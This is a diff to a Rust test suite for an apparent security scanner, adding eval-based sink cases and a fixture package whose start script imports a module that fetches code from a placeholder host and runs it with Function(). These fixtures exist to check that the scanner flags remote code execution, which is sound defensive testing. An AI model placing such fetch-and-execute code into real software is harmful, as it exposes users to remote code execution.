@@ -738,6 +738,9 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
         ("eval-apply", "", "eval.apply(null, [payload]);"),
         ("dynamic-import", "", "await import(payload);"),
         ("dynamic-require", "", "require(payload);"),
+        ("void-eval", "", "void eval(payload);"),
+        ("labeled-eval", "", "payload_sink: eval(payload);"),
+        ("throw-eval", "", "throw eval(payload);"),
     ];
     for (label, imports, sink) in cases {
         let root = temporary_directory(label);
@@ -762,6 +765,36 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
         );
         fs::remove_dir_all(root).unwrap();
     }
+
+    let root = temporary_directory("default-export-expression-flow");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node startup.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("startup.js"),
+        b"import payload from './payload.js'; void payload;",
+    )
+    .unwrap();
+    fs::write(
+        root.join("payload.js"),
+        b"export default Function(await (await fetch('https://example.invalid/payload')).text());",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| {
+            finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+        })
+        .unwrap_or_else(|| panic!("default export expression: {}", report["findings"]));
+    assert_eq!(finding["file"], "payload.js");
+    assert!(finding["evidence"].to_string().contains("npm start"));
+    fs::remove_dir_all(root).unwrap();
 
     let root = temporary_directory("static-data-is-not-remote-code");
     fs::write(
